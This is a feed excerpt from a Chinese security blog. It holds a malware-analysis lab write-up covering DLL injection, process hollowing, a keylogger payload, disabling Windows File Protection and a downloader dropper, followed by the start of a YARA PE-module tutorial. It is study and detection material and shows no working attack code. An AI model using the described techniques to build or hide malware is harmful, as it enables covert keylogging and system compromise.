    <link href="https://b1ackie.cn/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/"/>
    <id>https://b1ackie.cn/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/</id>
    <published>2021-09-23T06:12:55.000Z</published>
    <updated>2021-09-24T09:16:58.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-12-1"><a href="#Lab-12-1" class="headerlink" title="Lab 12-1"></a>Lab 12-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>打开程序后，每隔一段时间都会弹出一个窗口</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-1.png"></p><p>使用火绒剑监控行为，发现其有注入的行为。可以看到注入的进程是Explorer.exe</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-2.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-3.png"></p><p>可以看出来它获取了explorer的PID然后进行了DLL注入，注入的DLL为Lab12-01.dll。它获得进程PID的方式是通过EnumProcesses、EnumProcessModules、GetModuleBaseNameA这三个函数实现的。首先通过EnumProcesses获得所有进程的PID，然后打开每个进程，再通过EnumProcessModules、GetModuleBaseNameA获取进程名字，再和explorer.exe进行比较判断。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-4.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-5.png"></p><p>现在来分析一下注入的DLL文件，DLLMAIN中创建了一个新的线程。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-6.png"></p><p>新的线程，会拼接一个字符串，也就是前面弹出窗口的标题的次数，会无限制的增长，那么创建的这个新线程应该就是弹窗函数了，进去看果然如此，最后调用sleep函数。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-7.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/1-8.png"></p><h3 id="1-在你运行恶意代码可执行文件时，会发生什么？"><a href="#1-在你运行恶意代码可执行文件时，会发生什么？" class="headerlink" title="1.在你运行恶意代码可执行文件时，会发生什么？"></a>1.在你运行恶意代码可执行文件时，会发生什么？</h3><p>会将Lab12-01.dll注入到explorer.exe中，然后每隔一分钟弹出一个窗口。</p><h3 id="2-哪个进程会被注入"><a href="#2-哪个进程会被注入" class="headerlink" title="2.哪个进程会被注入"></a>2.哪个进程会被注入</h3><p>explorer.exe</p><h3 id="3-你如何能够让恶意代码停止弹出窗口"><a href="#3-你如何能够让恶意代码停止弹出窗口" class="headerlink" title="3.你如何能够让恶意代码停止弹出窗口"></a>3.你如何能够让恶意代码停止弹出窗口</h3><p>重新启动explorer.exe</p><h3 id="4-这个恶意代码样本是如何工作的？"><a href="#4-这个恶意代码样本是如何工作的？" class="headerlink" title="4.这个恶意代码样本是如何工作的？"></a>4.这个恶意代码样本是如何工作的？</h3><p>它会进行远程线程注入将Lab12-01.dll注入到explorer.exe中，然后每分钟都会弹出一个窗口。</p><h2 id="Lab-12-2"><a href="#Lab-12-2" class="headerlink" title="Lab 12-2"></a>Lab 12-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>看到Main函数流程较短</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-1.png"></p><p>首先获得了svchost.exe的路径</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-2.png"></p><p>然后是从资源节读取了数据，然后有判断，如果开头不是MZ的话，会调用<code>401000</code>函数。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-3.png"></p><p>进入查看，可以看到是一个异或解密，那么这个资源节中的数据是异或0x41进行加密。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-4.png"></p><p>之后就是一个傀儡进程的创建，将shellcode注入到svchost.exe中</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-5.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-6.png"></p><p>把shellcodedump出来分析一下，发现是一个键盘记录的程序</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-7.png"></p><p>查看挂钩函数fn</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-8.png"></p><p>记录键盘输入内容</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/2-9.png"></p><h3 id="1-这个程序的目的是什么？"><a href="#1-这个程序的目的是什么？" class="headerlink" title="1.这个程序的目的是什么？"></a>1.这个程序的目的是什么？</h3><p>注入shellcode到svchost.exe，实现键盘钩子</p><h3 id="2-启动器恶意代码是如何隐蔽执行的？"><a href="#2-启动器恶意代码是如何隐蔽执行的？" class="headerlink" title="2.启动器恶意代码是如何隐蔽执行的？"></a>2.启动器恶意代码是如何隐蔽执行的？</h3><p>将shellcode注入到svchost.exe，实现了一个傀儡进程。</p><h3 id="3-恶意代码的负载存储在哪里？"><a href="#3-恶意代码的负载存储在哪里？" class="headerlink" title="3.恶意代码的负载存储在哪里？"></a>3.恶意代码的负载存储在哪里？</h3><p>存储在资源节之中</p><h3 id="4-恶意负载是如何被保护的？"><a href="#4-恶意负载是如何被保护的？" class="headerlink" title="4.恶意负载是如何被保护的？"></a>4.恶意负载是如何被保护的？</h3><p>与0x41异或加密了</p><h3 id="5-字符串列表是如何被保护的？"><a href="#5-字符串列表是如何被保护的？" class="headerlink" title="5.字符串列表是如何被保护的？"></a>5.字符串列表是如何被保护的？</h3><p>这个问题我没看懂，看了书上的答案，书上说是<code>401000</code>处函数，进行XOR编码。那个函数实际上就是解密shellcode的函数。所以它的意思应该是，shellcode中的字符串是如何被保护的。</p><h2 id="Lab-12-3"><a href="#Lab-12-3" class="headerlink" title="Lab 12-3"></a>Lab 12-3</h2><p>这就是Lab 12-2中的shellcode，刚才已经详细分析过了，就不再进行分析了。</p><h3 id="1-这个恶意负载的目的是什么？"><a href="#1-这个恶意负载的目的是什么？" class="headerlink" title="1.这个恶意负载的目的是什么？"></a>1.这个恶意负载的目的是什么？</h3><p>键盘记录</p><h3 id="2-恶意负载是如何注入自身的？"><a href="#2-恶意负载是如何注入自身的？" class="headerlink" title="2.恶意负载是如何注入自身的？"></a>2.恶意负载是如何注入自身的？</h3><p>这个我也没看懂，没明白什么叫注入自身，因为没看到注入行为，看了书上的答案，意思是</p><blockquote><p>挂钩注入，来偷取击键记录</p></blockquote><p>原来是这样，好吧…</p><h3 id="3-这个恶意程序还创建了哪些其他文件？"><a href="#3-这个恶意程序还创建了哪些其他文件？" class="headerlink" title="3.这个恶意程序还创建了哪些其他文件？"></a>3.这个恶意程序还创建了哪些其他文件？</h3><p>创建了practicalmalwareanalysis.log文件，来记录。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/3-1.png"></p><h2 id="Lab-12-4"><a href="#Lab-12-4" class="headerlink" title="Lab 12-4"></a>Lab 12-4</h2><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>打开发现其前部分与Lab12-1是一致的，就不再进行分析饿了，只是在<code>401000</code>中是winlogon.exe，也就是前面这部分是获取winlogon.exe的PID</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-1.png"></p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-2.png"></p><p>现在来分析一下后面的部分</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-3.png"></p><p>首先是进行了提权，判断是否有SeDebugPrivilege权限，如果没有的话会进行提权。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-4.png"></p><p>然后会进行远程线程注入，注入函数是sfc_os.dll中的序号为2的函数，</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-5.png"></p><p>然后会移动文件</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-6.png"></p><p>最后是一个资源释放，释放到C:\Windows\system32\wupdmgr.exe，并且隐藏窗口启动它。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-7.png"></p><p>把资源节中的程序dump下来分析，首先看到启动了winup.exe也就是原始的wupdmgr.exe，然后会访问<a href="http://www.practicalmalwareanalysis.com/updater.exe">http://www.practicalmalwareanalysis.com/updater.exe</a> ，进行下载更新恶意代码。</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-8.png"></p><h3 id="1-位置0x401000的代码完成了什么功能"><a href="#1-位置0x401000的代码完成了什么功能" class="headerlink" title="1.位置0x401000的代码完成了什么功能"></a>1.位置0x401000的代码完成了什么功能</h3><p>判断当前进程的PID是否是winlogon.exe</p><p><img src="/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/4-2.png"></p><h3 id="2-代码注入了哪些进程？"><a href="#2-代码注入了哪些进程？" class="headerlink" title="2.代码注入了哪些进程？"></a>2.代码注入了哪些进程？</h3><p>winlogon.exe</p><h3 id="3-使用LoadLibraryA装载了哪个DLL程序？"><a href="#3-使用LoadLibraryA装载了哪个DLL程序？" class="headerlink" title="3.使用LoadLibraryA装载了哪个DLL程序？"></a>3.使用LoadLibraryA装载了哪个DLL程序？</h3><p>sfc_os.dll</p><h3 id="4-传递给CreateRemoteThread调用的第四个参数是什么？"><a href="#4-传递给CreateRemoteThread调用的第四个参数是什么？" class="headerlink" title="4.传递给CreateRemoteThread调用的第四个参数是什么？"></a>4.传递给CreateRemoteThread调用的第四个参数是什么？</h3><p>sfc_os.dll中的序号为2的函数，是一个名为SfcTerminateWatcherThread的函数，用来关闭windows的文件保护。</p><h3 id="5-二进制主程序释放出了哪个恶意代码？"><a href="#5-二进制主程序释放出了哪个恶意代码？" class="headerlink" title="5.二进制主程序释放出了哪个恶意代码？"></a>5.二进制主程序释放出了哪个恶意代码？</h3><p>wupdmgr.exe，原始的wupdmgr.exe被放到了temp目录下，重命名为了winup.exe</p><h3 id="6-释放出恶意代码的目的是什么？"><a href="#6-释放出恶意代码的目的是什么？" class="headerlink" title="6.释放出恶意代码的目的是什么？"></a>6.释放出恶意代码的目的是什么？</h3><p>会从指定的域名中下载一些资源，来进行更新，而windows本身的wupdmgr.exe被转移到temp目录下，在持久化驻留的同时，也不影响原程序的运行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-12-1&quot;&gt;&lt;a href=&quot;#Lab-12-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 12-1&quot;&gt;&lt;/a&gt;Lab 12-1&lt;/h2&gt;&lt;h3 id=&quot;详细分析&quot;&gt;&lt;a href=&quot;#详细分析&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>yara规则学习笔记（三）</title>
    <link href="https://b1ackie.cn/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://b1ackie.cn/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2021-09-22T07:31:15.000Z</published>
    <updated>2021-09-26T10:14:05.070Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基本的一些语法，规则的应用基本已经学习完了，现在来练习一下模块的用法，主要先是PE这个模块，具体的每一个值的用法在官方文档中已经描述的非常详细了，我就不再过多的去介绍其用法了，我只是拿过来部分去进行实际的编写测试。在本篇之前，应该至少要对PE文件结构有了解，如果对PE还不是非常的了解的话，建议先去学习PE结构。</p><p>官方文档PE模块地址：</p><p><a href="https://yara.readthedocs.io/en/v4.1.2/modules/pe.html">https://yara.readthedocs.io/en/v4.1.2/modules/pe.html</a></p><p>之前的学习笔记</p><p><a href="https://b1ackie.cn/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">yara规则学习笔记（一）</a></p><p><a href="https://b1ackie.cn/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/">yara规则学习笔记（二）</a></p><h2 id="PE模块"><a href="#PE模块" class="headerlink" title="PE模块"></a>PE模块</h2><p>导入PE模块非常简单，加入</p><blockquote><p>import “pe”</p></blockquote><p>这样即可导入。</p><p>该模块中公布了PE结构中大部分存在的字段，并提供了可用于编写更加具有针对性的功能。</p><p>官方示例</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">single_section</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.number_of_sections == <span class="hljs-number">1</span><br>&#125;<br><br>rule <span class="hljs-class">control_panel_applet</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.exports(<span class="hljs-string">&quot;CPlApplet&quot;</span>)<br>&#125;<br><br>rule <span class="hljs-class">is_dll</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.characteristics &amp; pe.DLL<br>&#125;<br><br>rule <span class="hljs-class">is_pe</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        pe.is_pe<br>&#125;<br></code></pre></div></td></tr></table></figure><p>首先先编写一个弹窗的exe来进行测试，不进行任何的优化设置。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;yara rule test&quot;</span>, <span class="hljs-string">&quot;b1ackie!&quot;</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="machine"><a href="#machine" class="headerlink" title="machine"></a>machine</h3><p>machine字段是运行平台，可以在编写时指定对应的值来判断运行平台，具体的值请去官方文档进行查看。</p><p>查看编写的测试文件的machine，可以看到是Intel386。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/1.png"></p><p>编写相应的规则</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">machine</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.machine == pe.MACHINE_I386<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/2.png"></p><h3 id="timestamp"><a href="#timestamp" class="headerlink" title="timestamp"></a>timestamp</h3><p>时间戳</p><p>在前面可以看到时间戳是6150116D</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">time</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.timestamp == <span class="hljs-number">0x6150116D</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="size-of-optional-header"><a href="#size-of-optional-header" class="headerlink" title="size_of_optional_header"></a>size_of_optional_header</h3><p>可选头的大小</p><p>从前面的图片可以看到，可选头的大小是0xE0，编写规则。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">size_of_optional_header</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.size_of_optional_header == <span class="hljs-number">0xE0</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="size-of-code"><a href="#size-of-code" class="headerlink" title="size_of_code"></a>size_of_code</h3><p>这是IMAGE_OPTIONAL_HEADER::SizeOfCode的值</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/3.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">size_of_code</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.size_of_code == <span class="hljs-number">0xE00</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="entry-point"><a href="#entry-point" class="headerlink" title="entry_point"></a>entry_point</h3><p>入口点</p><p>使用OD打开测试程序，可以看到入口点处的代码十六进制值</p><blockquote><p>E8 C5 03 00 00</p></blockquote><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/4.png"></p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-keyword">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;E8 C5 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span> at pe.entry_point<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="entry-point-raw"><a href="#entry-point-raw" class="headerlink" title="entry_point_raw"></a>entry_point_raw</h3><p>入口点的地址</p><p>查看入口点地址</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/5.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.entry_point_raw == <span class="hljs-number">0x126C</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="base-of-code"><a href="#base-of-code" class="headerlink" title="base_of_code"></a>base_of_code</h3><p>IMAGE_OPTIONAL_HEADER::BaseOfCode 的值</p><h3 id="base-of-data"><a href="#base-of-data" class="headerlink" title="base_of_data"></a>base_of_data</h3><p>IMAGE_OPTIONAL_HEADER::BaseOfData 的值</p><h3 id="image-base"><a href="#image-base" class="headerlink" title="image_base"></a>image_base</h3><p>IMAGE_OPTIONAL_HEADER::ImageBase 的值</p><p>现在来一起测试一下，查看示例程序这三项的值</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/6.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule test<br>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.<span class="hljs-keyword">base_of_code </span>== <span class="hljs-number">0x1000</span> <span class="hljs-keyword">and </span><br>pe.<span class="hljs-keyword">base_of_data </span>== <span class="hljs-number">0x2000</span> <span class="hljs-keyword">and</span><br><span class="hljs-keyword"></span>pe.image_base == <span class="hljs-number">0x400000</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="data-directories"><a href="#data-directories" class="headerlink" title="data.directories"></a>data.directories</h3><p>数据目录表中的IMAGE_DATA_DIRECTORY结构信息，RVA和SIZE。具体的字段参考官方文档。</p><p>这里用导入表（IMAGE_DIRECTORY_ENTRY_IMPORT）来做测试，查看示例程序的导入表的RVA和size</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/7.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.data_directories</span><br><span class="hljs-selector-attr">[pe.IMAGE_DIRECTORY_ENTRY_IMPORT]</span><span class="hljs-selector-class">.virtual_address</span><br>== <span class="hljs-number">0</span>x2594 <br>and<br>pe<span class="hljs-selector-class">.data_directories</span><br><span class="hljs-selector-attr">[pe.IMAGE_DIRECTORY_ENTRY_IMPORT]</span><span class="hljs-selector-class">.size</span><br>== <span class="hljs-number">0</span>xb4<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="number-of-sections"><a href="#number-of-sections" class="headerlink" title="number_of_sections"></a>number_of_sections</h3><p>pe文件中的节的数量</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/8.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.number_of_sections == <span class="hljs-number">5</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="sections"><a href="#sections" class="headerlink" title="sections"></a>sections</h3><p>PE文件中的节的信息，PE 的每个部分对应一个。可以使用 [] 